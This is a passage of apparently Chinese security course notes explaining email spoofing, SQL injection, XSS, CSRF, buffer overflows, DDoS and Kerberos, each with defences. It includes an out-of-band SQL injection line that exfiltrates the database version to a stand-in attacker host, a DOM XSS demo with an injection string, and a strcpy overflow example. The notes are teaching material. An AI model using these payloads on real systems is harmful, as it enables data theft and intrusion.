<h3 id="电子邮件欺骗与邮件安全pgp">电子邮件欺骗与邮件安全（PGP）</h3>
<p><strong>原理：</strong></p>
<ol>
<li>邮件系统的组成</li>
</ol>
<ul>
<li>用户代理（User Agent）：用户端发现和收信的程序，负责将信件按照一定标准包装，然后送到邮件服务器或将邮件收回。</li>
<li>传输代理（Transfer Agent）：负责信件的交换和传输，将信件传送到适当的邮件服务器。</li>
<li>投递代理（Delivery Agent）：将信件分发至最终用户的邮箱。</li>
</ul>
<ol start="2">
<li>正常情况下，邮件会将发送者的姓名和地址包括进邮件头中，但有时发送者不希望收件者知道是谁发的（匿名邮件）：</li>
</ol>
<ul>
<li>最简单的方法：改变电子邮件的发送者的名字，但通过邮件头的其他信息仍能跟踪到发送者；</li>
<li>彻底的方式：让其他人发送这个邮件，发信地址就变成转发者的地址，借助匿名服务器。</li>
</ul>
<figure data-type="image" tabindex="27"><img src="https://3nd.xyz/post-images/move/2019-12-09-18-59-46.png" alt="" loading="lazy"></figure>
<p><strong>方法：</strong></p>
<ol>
<li>
<p>利用相似的电子邮件地址；</p>
</li>
<li>
<p>直接使用伪造的 E-mail 地址</p>
</li>
</ol>
<p>SMTP 协议的致命缺陷——遵循过于信任原则：不对邮件发送者的身份进行验证。</p>
<ol start="3">
<li>远程登录到 SMTP 端口（25）发送邮件。</li>
</ol>
<p><strong>攻击模式：</strong> 钓鱼（Phishing）邮件、鱼叉网络钓鱼（Spear Phishing）。</p>
<p><strong>防御：</strong></p>
<ul>
<li>树立风险意识，不要随意打开一个不信任的邮件。</li>
</ul>
<h2 id="0x06-web-攻击与防御">0x06 Web 攻击与防御 📌</h2>
<h3 id="sql-注入">SQL 注入</h3>
<p><strong>原理</strong>：</p>
<p>利用 Web 应用对后台<strong>数据库查询语句</strong>处理存在的安全漏洞，攻击者提交一段精心构造的数据库查询代码，根据返回的结果，获取敏感数据。</p>
<p>受影响的系统：对输入参数不进行检查和过滤的系统。</p>
<p><strong>分类</strong>：</p>
<ol>
<li>根据有无回显</li>
</ol>
<ul>
<li>
<p>普通注入：根据数据库提示的有价值的信息进行注入</p>
</li>
<li>
<p>盲注（Blind SQL Injection）：没有提供详细错误信息，攻击者需要对表中的每个字段进行猜解。</p>
</li>
</ul>
<ol start="2">
<li>根据注入点类型</li>
</ol>
<ul>
<li>
<p>数字型注入</p>
</li>
<li>
<p>字符型注入</p>
</li>
</ul>
<ol start="3">
<li>其他分类</li>
</ol>
<ul>
<li>
<p>First Order Injection</p>
<ul>
<li>In-band SQLi（攻击者能够使用相同的信道发起攻击并收集信息）</li>
<li>Union Select SQLi</li>
<li>Error-Based SQLi</li>
<li>Blind SQLi</li>
<li>Time-based SQLi</li>
<li>Out-of-band SQLi<br>
在 SQL 注入攻击中，攻击者的 Payload 代码成功执行了，但由于各种因素所致，结果无法通过 HTTP Response 来答复攻击者的 HTTP Request，攻击者也就无法从这种“信道”获取 Payload 产生的数据。而 OOB 中，攻击者通过构造特殊的 Payload，让受害主机向指定主机发送 HTTP 请求或 DNS 查询，而这些请求报文中携带了查询结果的数据。<pre><code class="language-sql">select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
</code></pre>
</li>
</ul>
</li>
<li>
<p>Second Order Injection</p>
</li>
<li>
<p>Others</p>
<ul>
<li>Stacked queries</li>
<li>Inline Queries</li>
</ul>
</li>
</ul>
<p><strong>注入过程</strong>：</p>
<ol>
<li>
<p>客户端：参数值等数据被修改</p>
</li>
<li>
<p>服务端：未经检查和过滤，将修改的数据注入到 SQL 语句中，SQL 语句功能被修改</p>
</li>
<li>
<p>数据库引擎：执行被修改后的 SQL 命令</p>
</li>
<li>
<p>服务端：将注入的结果返回给客户端</p>
</li>
<li>
<p>客户端：根据上一次注入获取到的敏感信息构造注入语句进行进一步注入</p>
</li>
</ol>
<p><strong>注入防范</strong>：</p>
<ol>
<li>
<p>使用<strong>预编译</strong>语句，绑定变量。</p>
</li>
<li>
<p>对用户提交的数据和输入参数进行严格的<strong>过滤</strong>。</p>
</li>
<li>
<p>摒弃 SQL 语句，改用<strong>存储过程</strong>来访问和操作数据。</p>
</li>
<li>
<p>使用<strong>安全函数</strong>：比如 OWASP ESAPI。</p>
</li>
<li>
<p><strong>最小权限</strong>原则。</p>
</li>
</ol>
<h3 id="跨站脚本攻击-xss">跨站脚本攻击 XSS</h3>
<p><strong>原理</strong>：</p>
<p>跨站脚本攻击(Cross Site Script)：攻击者向 Web 页面中插入恶意脚本代码，当用户浏览网页时，嵌入其中的代码被执行。</p>
<p><strong>分类</strong>：</p>
<ol>
<li><strong>反射型 XSS</strong> (Reflected XSS)</li>
</ol>
<p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。<br>
反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
<ol start="2">
<li><strong>存储型 XSS</strong> (Stored XSS)</li>
</ol>
<p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。<br>
此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
<ol start="3">
<li><strong>DOM 型 XSS</strong> (DOM-Based XSS)</li>
</ol>
<p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受<strong>客户端浏览器</strong>的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 <strong>DOM 文本对象模型</strong>，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
<p><strong>* 反射型 XSS 与 DOM 型 XSS 的区别</strong>：</p>
<ol>
<li>
<p>反射型 XSS，绝⼤多数依托 url 进⾏攻击，原理如下：将恶意参数以 url 的形式，传⼊服务器，服务器再将这个恶意参数插⼊到 Html 标签⾥⾯，并以响应包的形式反馈到浏览器，浏览器解析恶意代码即触发。</p>
</li>
<li>
<p>⽽ DOM 型 XSS，主要是 Js 中的 DOM ⽅法，构造恶意标签插⼊到 Html 节点中，浏览器解析即触发。<strong>整个过程都是在前端实现的，不涉及服务器</strong>。</p>
</li>
</ol>
<p>Demo:</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt; DOM Based XSS Demo &lt;/title&gt;
    &lt;script&gt;
      function xsstest() {
        var str = document.getElementById(&quot;input&quot;).value;
        document.getElementById(&quot;output&quot;).innerHTML = &quot;&lt;img src='&quot;+str+&quot;'&gt;&lt;/img&gt;&quot;;
      }
    &lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id=&quot;output&quot;&gt;&lt;/div&gt;
    &lt;input type=&quot;text&quot; id=&quot;input&quot; size=50 value=&quot;&quot;/&gt;
    &lt;input type=&quot;button&quot; value=&quot;提交&quot; onclick=&quot;xsstest()&quot;/&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>写入恶意 js 代码，如<code>1' onerror='alert(1</code>，会被 DOM 方法以标签的形式插入 output 节点中并执行，整个过程中没有与服务器进行交互，全部都是在前端完成的。</p>
<p>反射型 XSS 与 DOM 型 XSS 的维度不同： 反射型会将参数以 url 形式交给服务器，服务器处理之后，会将参数放⼊ html，并以响应形式显示到前端。 但是 DOM 型整个过程都在前端执⾏，DOM 不关注调⽤参数的来源，是前端输⼊，还是服务器处理之后的， 它只会把 DOM ⽅法接收的参数，以 DOM ⽅法定义的形式插⼊到⽬标节点中，整个过程只在前端执⾏，也就是我们⽹上经常看到的对于<strong>客户端</strong>的攻击。 所以我们可以把 DOM 型放在反射型类别，也可以放在存储型类别。取决于 DOM ⽅法要处理参数的来源。 来⾃ <code>url</code> 请求，即为反射型；来⾃<code>后台数据库</code>，即为存储型。</p>
<p><strong>攻击过程：</strong></p>
<ol>
<li>
<p>寻找 XSS 漏洞</p>
</li>
<li>
<p>注入恶意代码</p>
</li>
<li>
<p>欺骗用户访问</p>
</li>
</ol>
<p><strong>防御手段：</strong></p>
<ol>
<li>
<p>用户层加强教育。</p>
</li>
<li>
<p>开发层对所有用户提交的内容进行可靠的输入验证，保护所有敏感功能，以防被机器人自动执行或者被第三方网站执行（采用 Session token、验证码等）。</p>
</li>
</ol>
<h3 id="其他攻击类型">其他攻击类型</h3>
<ul>
<li>跨站请求伪造 CSRF</li>
</ul>
<p>跨站请求伪造（Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。</p>
<figure data-type="image" tabindex="28"><img src="https://3nd.xyz/post-images/move/2019-12-10-00-31-39.png" alt="" loading="lazy"></figure>
<p><strong>* 防御手段</strong>：</p>
<ol>
<li>
<p>尽量使用 POST，限制 GET.</p>
</li>
<li>
<p>Cookie 策略(<a href="https://www.cnblogs.com/ziyunfei/p/5637945.html">SameSite 头</a>).</p>
</li>
<li>
<p>验证码.</p>
</li>
<li>
<p>Refer Check.</p>
</li>
<li>
<p>Anti CSRF Token.</p>
</li>
</ol>
<h2 id="0x07-缓冲区溢出攻击与防御">0x07 缓冲区溢出攻击与防御</h2>
<h3 id="缓冲区溢出原理">缓冲区溢出原理</h3>
<p><strong>缓冲区(Buffer)<strong>是包含相同数据类型实例的一个连续的计算机内存块，是程序运行期间在</strong>内存</strong>中分配的一个连续区域，用于保存包括字符数组在内的各种数据类型。</p>
<p><strong>缓冲区溢出(Buffer Overflow)</strong>: 向固定长度的缓冲区写入超出其预定长度的内容，造成缓冲区数据溢出，从而覆盖缓冲区周围的内存空间。</p>
<p>攻击者借此精心构造填充数据，导致原有<strong>流程改变</strong>，转而执行特殊的代码，最终获取控制权。</p>
<p>程序在内存中的存放形式：程序运行时，计算机会在内存区域开辟一段连续的内存块，包括<strong>代码段</strong>、<strong>数据段</strong>和<strong>堆栈段</strong>三部分。</p>
<figure data-type="image" tabindex="29"><img src="https://3nd.xyz/post-images/move/2019-12-10-08-14-44.png" alt="" loading="lazy"></figure>
<ol>
<li>代码段(<code>.text</code>)</li>
</ol>
<p>文本段(Text Segment)，存放<strong>程序的机器码和只读数据</strong>，一般标记为<strong>只读</strong>，任何对该区域的写操作都会导致<strong>段错误</strong>(Segment Fault)。</p>
<ol start="2">
<li>数据段<br>
数据段在编译时分配。</li>
</ol>
<ul>
<li>已初始化的数据段(<code>.data</code>)：保存全局的和静态的已初始化变量。</li>
<li>资源数据段(<code>.rdata</code>)：保存程序中全局可访问的只读数据。</li>
<li>未初始化的数据段(<code>.bss</code>)：保存全局的和静态的未初始化变量。</li>
</ul>
<ol start="3">
<li>堆 Heap</li>
</ol>
<p>位于 BSS 段上面，存储程序运行时分配的变量。</p>
<ul>
<li>
<p>大小不固定，可动态扩张、缩减。<br>
由 malloc()、new()等内存分配函数实现，当调用 new() 等函数时，新分配内存被动态添加到堆上（堆扩张）；当利用 free(), delete() 等函数释放内存时，内存从堆中剔除（堆缩减）。</p>
</li>
<li>
<p>堆内存释放由应用程序控制。<br>
通常一个 new() 要对应一个 delete()，如果程序没有释放，程序结束后操作系统会自动回收。</p>
</li>
</ul>
<ol start="4">
<li>栈 Stack</li>
</ol>
<p>先进后出(FILO)，函数调用时的临时信息结构，如函数调用传递的参数、函数返回地址、函数的局部变量等。</p>
<ul>
<li>程序<strong>运行时</strong>由编译器<strong>按需分配</strong>，不需要时自动清除。</li>
</ul>
<ol start="5">
<li>
<p>堆和栈的区别</p>
</li>
<li>
<p>分配和管理方式不同</p>
</li>
</ol>
<pre><code>- 堆：动态分配，空间的分配和释放都是由程序员控制。
- 栈：由编译器自动管理。
</code></pre>
<ol start="2">
<li>产生的碎片不同</li>
</ol>
<pre><code>- 堆：频繁的 new()/delete() 或 malloc()/free() 势必会造成内存空间的不连续，造成大量碎片，使程序运行效率降低。
- 栈：先进后出的队列，永远不可能有一个内存块从栈中间弹出。
</code></pre>
<ol start="3">
<li>生长方向不同</li>
</ol>
<pre><code>- 堆：向着内存地址增加的方向增长。
- 栈：向着内存地址减小的方向增长，由内存的高地址向低地址方向增长。
</code></pre>
<ol start="6">
<li>
<p>PE 文件与虚拟内存之间的映射<br>
* PE 文件(Portable Executable)：可移植的可执行的文件。<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-08-48-35.png" alt="" loading="lazy"></p>
</li>
<li>
<p>几个重要概念</p>
</li>
</ol>
<ul>
<li>
<p>文件偏移地址(File Offset): 数据在 PE 文件中相对文件开头的偏移。</p>
</li>
<li>
<p>装载基址(Image Base): PE 文件装入虚拟内存的基地址，默认情况下，EXE 文件的基址为<code>0x00400000</code>，DLL 文件的基址为 <code>0x10000000</code>。</p>
</li>
<li>
<p>虚拟内存地址(Virtual Address, VA): PE 文件中的指令被装入（虚拟）内存后的地址。</p>
</li>
<li>
<p>相对虚拟地址(Relative Virtual Address, RVA): VA 相对基址的偏移量，<code>VA = Image Base + RVA</code>。</p>
</li>
<li>
<p>节偏移：由存储单元差异引起的节基址差。</p>
<p><code>文件偏移地址 = RVA - 节偏移 = VA - Image Base - 节偏移</code>。</p>
</li>
</ul>
<figure data-type="image" tabindex="30"><img src="https://3nd.xyz/post-images/move/2019-12-10-08-58-10.png" alt="" loading="lazy"></figure>
<h3 id="栈溢出">栈溢出 📌</h3>
<figure data-type="image" tabindex="31"><img src="https://3nd.xyz/post-images/move/2019-12-10-09-03-27.png" alt="" loading="lazy"></figure>
<p>PE 文件代码段中包含的机器码会装入内存的代码段(.text)。发生函数调用时，<strong>函数的调用关系</strong>等信息会动态保存到<strong>内存的栈区</strong>。如果需要动态分配内存，则在内存的<strong>堆</strong>区分配合适的区域。</p>
<p>在 C 函数中，每个函数都有一个<strong>栈帧</strong>，它用来保存这个函数的参数、局部变量、返回地址等信息，是系统栈的一部分。</p>
<pre><code class="language-c++">void foo(char *arg1, char *arg2) { int temp = 0; char buffer[4]; strcpy(buffer, arg1); }
</code></pre>
<p>该函数对应的栈帧如下：</p>
<figure data-type="image" tabindex="32"><img src="https://3nd.xyz/post-images/move/2019-12-10-09-23-14.png" alt="" loading="lazy"></figure>
<ul>
<li><code>ESP</code>(栈指针寄存器, extended stack pointer)：存放在系统栈最上面栈帧的栈顶，称为栈顶指针，用来指示当前栈帧的顶部。</li>
<li><code>EBP</code>(基址指针寄存器, extended base pointer)：存放系统栈最上面栈帧的栈底，称为栈基址指针，用来指示当前栈帧的底部。</li>
</ul>
<p>在调用这个函数时，压栈的顺序为：</p>
<ol>
<li>调用者压入需要保存的寄存器，通常这些寄存器包括 EAX，ECX 和 EDX等</li>
<li>按照从右往左的顺序压入参数 arg2 和 arg1</li>
<li>压入返回地址</li>
<li>调用者的 EBP</li>
<li>第一个声明的局部变量 temp</li>
<li>第二个声明的局部变量 buffer</li>
<li>被调用者即 foo 本身压入需要保存的寄存器， 通常这些寄存器包括 EBX，ESI 和 EDI 等</li>
</ol>
<p>由于局部变量 buffer 的长度是 4 个字节，而在使用 strcpy 函数的时候并没有判断参数 arg1 的长度，因此，当传入的 arg1 的长度大于 4 个字节时，多出的字节将会依次覆盖掉局部变量 temp、调用者的 EBP、返回地址等。<br>
通过精心构造 arg1 的值，就可以将返回地址覆盖为任意想要的值，以便于跳到 shellcode(缓冲区溢出攻击中植入进程的代码)。</p>
<h3 id="其他溢出的工作原理">其他溢出的工作原理</h3>
<ul>
<li>
<p>堆溢出</p>
</li>
<li>
<p>BSS溢出</p>
</li>
<li>
<p>格式化溢出</p>
</li>
<li>
<p>整数溢出</p>
</li>
</ul>
<p>* 一般攻击过程：</p>
<ol>
<li>
<p>在程序的地址空间里安排适当的代码(shellcode)；</p>
</li>
<li>
<p>通过适当的初始化寄存器和存储器，让程序跳转到安排好的地址空间执行。</p>
</li>
</ol>
<h3 id="缓冲区溢出的防御措施">缓冲区溢出的防御措施</h3>
<p>原因：<strong>编程语言缺乏类型安全，程序缺少边界检查。</strong></p>
<ol>
<li>源码级保护</li>
</ol>
<p>避免源码中的相关 BUG，注意检查边界，尽可能使用可替代的安全函数。</p>
<ol start="2">
<li>运行期保护</li>
</ol>
<p>插入代码进行<strong>数组边界检查</strong>，引用指针前进行<strong>指针完整性检查</strong>。</p>
<ol start="3">
<li>阻止攻击代码执行</li>
</ol>
<p>设置缓冲区地址空间(堆栈数据段)为不可执行，使攻击代码不能执行从而避免攻击。</p>
<ol start="4">
<li>加强系统防护</li>
</ol>
<p>操作系统的内存保护技术。</p>
<h2 id="0x08-拒绝服务攻击">0x08 拒绝服务攻击</h2>
<h3 id="概念">概念</h3>
<p>拒绝服务攻击(<code>Denial-of-Service Attack</code>)亦称洪水攻击，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<h3 id="分类">分类</h3>
<ol>
<li>按拒绝对象</li>
</ol>
<ul>
<li>
<p>带宽消耗型攻击</p>
<ul>
<li>洪水攻击：UDP、ICMP、Ping Of Death</li>
<li>放大攻击：NTP、DNS</li>
</ul>
</li>
<li>
<p>资源消耗型攻击</p>
<ul>
<li>SYN 洪水</li>
<li>LAND Attack</li>
<li>CC</li>
</ul>
</li>
</ul>
<p>* <a href="https://mochazz.github.io/2017/09/11/DDOS1/">DDOS原理与防御 - Mochazz</a></p>
<h3 id="ddos-工作原理">DDoS 工作原理</h3>
<p>分布式拒绝服务攻击(<code>Distributed Denial-of-Service Attack</code>)，是使用网络上两个或两个以上被攻陷的电脑作为 <code>僵尸</code> 向特定的目标发动 <code>拒绝服务</code> 式攻击。</p>
<h3 id="防御">防御</h3>
<ol>
<li>网络层 DDoS 防御</li>
</ol>
<ul>
<li>限制单 IP 请求频率，网络架构上做好优化，采用负载均衡分流。</li>
<li>防火墙等安全设备上设置禁止 ICMP 包等。</li>
<li>通过 DDoS 硬件防火墙的数据包规则过滤、数据流指纹检测过滤、及数据包内容定制过滤等技术对异常流量进行清洗过滤。</li>
<li>采用 ISP 近源清洗，使用电信运营商提供的近源清洗和流量压制，避免全站服务对所有用户彻底无法访问。这是对超过自身带宽储备和自身 DDoS 防御能力之外超大流量的补充性缓解措施。</li>
</ul>
<ol start="2">
<li>应用层 DDoS 防御</li>
</ol>
<ul>
<li>优化操作系统的 TCP/IP 栈。</li>
<li>应用服务器严格限制单个 IP 允许的连接数和 CPU 使用时间。</li>
<li>编写代码时，尽量实现优化并合理使用缓存技术。尽量让网站静态化，减少不必要的动态查询。网站静态化不仅能大大提高抗攻击能力，而且还给骇客入侵带来不少麻烦，至少到现在为止关于 HTML 的溢出还没出现。</li>
<li>增加 WAF（Web Application Firewall）设备，WAF 的中文名称叫做 Web 应用防火墙。Web 应用防火墙是通过执行一系列针对 HTTP / HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。</li>
<li>使用 CDN / 云清洗，在攻击发生时，进行云清洗。通常云清洗厂商策略有以下几步：预先设置好网站的 CNAME，将域名指向云清洗厂商的 DNS 服务器；在一般情况下，云清洗厂商的 DNS 仍将穿透 CDN 的回源的请求指向源站，在检测到- 攻击发生时，域名指向自己的清洗集群，然后再将清洗后的流量回源。</li>
<li>CDN 仅对 Web 类服务有效，针对游戏类 TCP 直连的服务无效。这时可以使用 DNS 引流 + ADS (Anti-DDoS System) 设备来清洗，还有在客户端和服务端通信协议做处理（如：封包加标签，依赖信息对称等）。</li>
</ul>
<h2 id="0x09-身份认证">0x09 身份认证</h2>
<h3 id="aaa">AAA</h3>
<p>用户对资源的访问过程：<code>AAA</code></p>
<ul>
<li>
<p>认证（<code>A</code>uthentication）</p>
<p>在做任何动作之前必须识别动作执行者的真实身份。又称<strong>鉴别、确认</strong>。主要是通过标识符鉴别用户身份，防止攻击者假冒合法用户获得访问权限。</p>
</li>
<li>
<p>授权（<code>A</code>uthorization）</p>
<p>当用户被确认合法后，赋予该用户进行文件和数据等的操作权限，包括读、写、执行及从属权等。</p>
</li>
<li>
<p>审计/记账（<code>A</code>ccounting）</p>
<p>每个人都应该为自己所做的操作负责，所以在做完事情之后要留下记录，以便核查责任。</p>
</li>
</ul>
<h3 id="常用身份认证技术">常用身份认证技术</h3>
<p>身份认证：验证一个主体身份的真实性或证实某事件、某消息是否属实的过程，通过验证一个或多个参数的有效性，来验证被验证者是否名副其实。</p>
<ol>
<li>知识证明 —— 基于被验证者所知道的</li>
</ol>
<ul>
<li>基于口令的认证
<ul>
<li>简单口令认证</li>
<li>基于单向函数的口令认证<br>
口令认证：<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-14-35-19.png" alt="" loading="lazy"><br>
口令更新：<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-14-36-46.png" alt="" loading="lazy"></li>
<li>一次性口令认证<br>
S/KEY 一次性口令系统。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>
<p>持有证明 —— 基于被验证者所拥有的</p>
</li>
<li>
<p>属性证明 —— 基于被验证者的生物特征</p>
</li>
</ol>
<h3 id="kerberos-协议">Kerberos 协议</h3>
<p>Kerberos: 基于可信第三方(Trusted Third Party, TTP)的认证协议；基于<strong>对称加密技术</strong>。</p>
<p>Kerberos 目标是把 Unix 认证、授权、审计的功能拓展到网络环境，实现<strong>集中的身份认证和密钥分配</strong>，用户只需输入一次身份验证信息，就可以访问多个服务。</p>
<p>基本思想（假设）：能正确对信息进行解密的用户即为合法用户。</p>
<p>用户在访问应用服务器之前，必须从第三方 (Kerberos 服务器) 获取该应用服务器的授权票据 (Ticket)。</p>
<p>Kerberos 认证协议包含 3 个子协议，称之为<strong>交换</strong>：</p>
<ol>
<li>
<p>认证服务器交换(AS 交换)</p>
</li>
<li>
<p>票据许可服务器交换(TGS 交换)</p>
</li>
<li>
<p>客户/服务器认证应用交换(AP 交换)</p>
</li>
</ol>
<p><strong>整体流程</strong>：</p>
<ol>
<li>
<p><strong>登录</strong>：客户端<code>用户 A</code> 输入用户名、密码</p>
</li>
<li>
<p><strong>认证</strong>：系统验证客户端<code>用户 A</code>身份</p>
</li>
<li>
<p><strong>授权</strong>：系统授权客户端<code>用户 A</code>访问<code>服务 S</code></p>
</li>
<li>
<p><strong>请求服务</strong>：客户端<code>用户 A</code>往<code>服务 S</code>发送请求</p>
</li>
</ol>
<p><strong>参与的角色</strong>：</p>
<ul>
<li>
<p><code>Client</code>: Application Client 应用客户端</p>
</li>
<li>
<p><code>AS</code>: Authentication Server 用来认证用户身份</p>
</li>
<li>
<p><code>TGS</code>: Ticket-Granting Service 用来授权服务访问</p>
</li>
<li>
<p><code>SS</code>: Service Server 用户所请求的服务</p>
</li>
</ul>
<figure data-type="image" tabindex="33"><img src="https://3nd.xyz/post-images/move/2019-12-10-14-59-52.png" alt="" loading="lazy"></figure>
<p>* KDC：密钥分发中心。</p>
<p>* 票据(Tikcet)：一种临时的证书，用 TGS 或应用服务器的密钥加密，分别为 TGS 票据和服务票据。</p>
<p><strong>详细流程</strong>：</p>
<ol>
<li>用户登录</li>
</ol>
<figure data-type="image" tabindex="34"><img src="https://3nd.xyz/post-images/move/2019-12-10-15-17-15.png" alt="" loading="lazy"></figure>
<ul>
<li>用户登录阶段，通常由用户输入<code>用户名</code>和<code>密码</code>信息。</li>
<li>在客户端侧，用户输入的<code>密码</code>信息被通过一个单向 Hash 函数生成一个<code>Client密钥</code>。</li>
</ul>
<ol start="2">
<li>请求身份认证</li>
</ol>
<p>2.1 客户端向AS发送认证请求</p>
<figure data-type="image" tabindex="35"><img src="https://3nd.xyz/post-images/move/2019-12-10-15-18-19.png" alt="" loading="lazy"></figure>
<ul>
<li>客户端为执行登录操作的用户向 <strong>AS</strong> 发送<strong>认证请求</strong>。</li>
<li>请求中带有<code>用户名</code>信息，用户名以明文形式发送到客户端。</li>
</ul>
<blockquote>
<p>Client 往 AS 发送认证请求时并未发送<code>密码</code>或<code>密钥</code>信息。</p>
</blockquote>
<p>2.2 AS 确认 Client 端登录者用户身份<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-15-23-07.png" alt="" loading="lazy"></p>
<ul>
<li>AS收到用户认证请求之后，根据请求中的<code>用户名</code>信息，从数据库中查找该用户名是否存在。</li>
<li>如果<code>用户名</code>存在，则对应的<code>密码</code>也可以从数据库中获取到。AS 利用相同的单向 Hash 函数为<code>密码</code>生成一个秘钥，如果第1步中用户提供的<code>密码</code>信息正确，该秘钥与用户登录章节中的<code>Client密钥</code>相同。</li>
<li>AS 为 Client 响应如下消息：
<ul>
<li><strong>Msg A</strong>  使用<code>Client密钥</code>加密的<code>Client/TGS SessionKey</code></li>
<li><strong>Msg B</strong> 使用<code>TGS密钥</code>加密的<code>TGT(Ticket-Granting-Ticket)</code>，因此该消息 Client 不可解析。<br>
TGT中包含如下信息：
<ul>
<li>Client/TGS SessionKey</li>
<li>Client ID</li>
<li>Ticket有效时间</li>
<li>Client网络地址</li>
</ul>
</li>
</ul>
</li>
<li>Client 收到 AS 的响应消息以后，利用自身的 <code>Client密钥</code> 可以对 Msg A 进行解密，这样可以获取到<code>Client/TGS SessionKey</code>。但由于 Msg B 是使用 <code>TGS密钥</code> 加密的，Client 无法对其解密。</li>
</ul>
<blockquote>
<ol>
<li>AS 响应的消息中有一条是属于 Client 的，但另外一条却属于 TGS。<br>
2. Client/TGS SessionKey 出现了两个 Copy，一个给 Client 端，一个给 TGS 端。<br>
3. 本文中提及的加密，如无特殊说明，均采用的是<strong>对称加密算法</strong>。</li>
</ol>
</blockquote>
<ol start="3">
<li>请求服务授权</li>
</ol>
<p>3.1 客户端向 TGS 发送请求服务授权请求<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-15-30-15.png" alt="" loading="lazy"><br>
客户端发送的请求中包含如下两个消息：</p>
<ul>
<li><strong>Msg C</strong>
<ul>
<li>要请求的服务 ID, 即 <code>Service ID</code>；</li>
<li>上一步 2.2 中由 AS 为 Client 提供的 <code>TGT</code>。</li>
</ul>
</li>
<li><strong>Msg D</strong>
<ul>
<li>使用 <code>Client/TGS SessionKey</code> 加密的 Authenticator 1 {Client ID, Timestamp}。</li>
</ul>
</li>
</ul>
<p>3.2 TGS 为 Client 响应服务授权票据<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-15-32-28.png" alt="" loading="lazy"><br>
TGS 为 Client 响应的消息包括：</p>
<ul>
<li><strong>Msg E</strong> 使用 <strong>Service密钥</strong> 加密的 Client-To-Server Ticket, 该 Ticket 中包含了如下信息:
<ul>
<li><code>Client/Server SessionKey</code></li>
<li>Client网络地址</li>
<li>Ticket有效时间</li>
<li>Client ID</li>
</ul>
</li>
<li><strong>Msg F</strong> 使用 <code>Client/TGS SessionKey</code> 加密的 <code>Client/Server SessionKey</code>。</li>
</ul>
<p>Msg F使用了<code>Client/TGS SessionKey</code>加密，因此，该消息对 Client 可见。Client 对其解密以后可获取到 <code>Client/Server SessionKey</code>。<br>
而 Msg E 使用了<code>Service密钥</code> 加密，该消息可视作是 TGS 给 Service Server 的消息，只不过由 Client 一起携带。</p>
<ol start="4">
<li>发送服务请求</li>
</ol>
<p>4.1 Client 向 SS(Service Server) 发送服务请求<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-15-35-30.png" alt="" loading="lazy"><br>
发送的消息中包括：</p>
<ul>
<li>Msg E 上一步 3.2 中，TGS 为 Client 响应的消息 Msg E。该消息可以理解为由 Client 为 SS 携带的消息。</li>
<li>Msg G 由 <code>Client/Server SessionKey</code> 加密的 <code>Authenticator 2</code>，包含 <code>{Client ID, Timestamp}</code> 信息。<br>
这里的 Authenticator 2 区别于前面 3.1 步骤中的 Authenticator 1。</li>
</ul>
<p>4.2 SS 响应 Client<br>
<img src="https://3nd.xyz/post-images/move/2019-12-10-15-37-28.png" alt="" loading="lazy"><br>
SS 收到客户端的服务请求之后，先利用自身的 <code>Service密钥</code> 对 <code>Msg E</code> 进行解密，提取出 <code>Client-To-Server Ticket</code>, 在 3.2 步骤中，提到了该 Ticket 中包含了 <code>Client/Server SessionKey</code> 以及 <code>Client ID</code> 信息。<br>
SS 使用 <code>Client/Server SessionKey</code> 解密 <code>Msg G</code>，提取 Client ID 信息，而后将该 Client ID 与 Client-To-Server Ticket 中的 Client ID 进行比对，如果匹配则说明 Client 拥有正确的<code>Client/Server SessionKey</code>。<br>
而后，SS 向 Client 响应 <code>Msg H</code>(包含使用<code>Client/Server SessionKey</code>加密的 Timestamp 信息)。<br>
Client 收到 SS 的响应消息 Msg H 之后，再使用<code>Client/Server SessionKey</code>对其解密，提取 Timestamp 信息，然后确认该信息与 Client 发送的 Authenticator 2 中的 Timestamp 信息一致。<br>
如上信息可以看出来，该交互过程起到了<code>Client</code>与<code>SS</code>之间的<strong>双向认证</strong>作用。<br>
* <a href="http://www.nosqlnotes.com/technotes/kerberos-protocol/">图解Kerberos协议原理</a></p>
<h3 id="pki-原理">PKI 原理</h3>
